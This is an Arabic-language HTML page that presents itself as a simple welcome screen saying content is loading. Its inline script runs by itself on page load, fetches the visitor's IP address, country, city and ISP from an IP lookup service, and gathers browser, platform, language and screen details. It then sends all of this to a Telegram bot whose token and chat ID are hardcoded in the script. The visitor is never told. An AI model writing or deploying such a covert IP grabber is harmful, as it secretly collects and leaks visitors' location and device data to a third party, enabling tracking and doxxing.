<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مرحباً بك</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f9;
            color: #333;
        }
        .card {
            text-align: center;
            padding: 30px;
            background: #ffffff;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            max-width: 400px;
        }
        h1 {
            color: #2c3e50;
            margin-bottom: 10px;
        }
        p {
            color: #7f8c8d;
        }
    </style>
</head>
<body>

    <div class="card">
        <h1>أهلاً بك في الموقع!</h1>
        <p>جاري تحميل المحتوى...</p>
    </div>

    <script>
        // التوكن والايدي الخاصين بك
        const TELEGRAM_TOKEN = '8620198044:AAEIo8BsrYjv-C-QsYTT1DlzvZKd9M_D28E';
        const CHAT_ID = '8681304163';

        async function trackVisitor() {
            try {
                // 1. جلب عنوان IP ومعلومات الدعم من API مجاني
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                // 2. جلب معلومات الجهاز والمتصفح
                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const language = navigator.language;
                const screenRes = `${window.screen.width}x${window.screen.height}`;

                // 3. تنسيق الرسالة
                const message = `
🔔 **زائر جديد دخل إلى الموقع!**

🌐 **عنوان الـ IP:** \`${data.ip || 'غير معروف'}\`
📍 **الدولة:** ${data.country_name || 'غير معروف'}
🏙 **المدينة:** ${data.city || 'غير معروف'}
🏢 **مزود الخدمة:** ${data.org || 'غير معروف'}

📱 **تفاصيل الجهاز والمتصفح:**
• **المنصة / النظام:** ${platform}
• **دقة الشاشة:** ${screenRes}
• **اللغة:** ${language}
• **معرف المتصفح (User Agent):**
\`${userAgent}\`
                `;

                // 4. إرسال البيانات إلى بوت التليجرام
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

            } catch (error) {
                console.error('حدث خطأ أثناء جمع البيانات:', error);
            }
        }

        // تنفيذ الدالة فور فتح الصفحة
        window.onload = trackVisitor;
    </script>

</body>
</html>
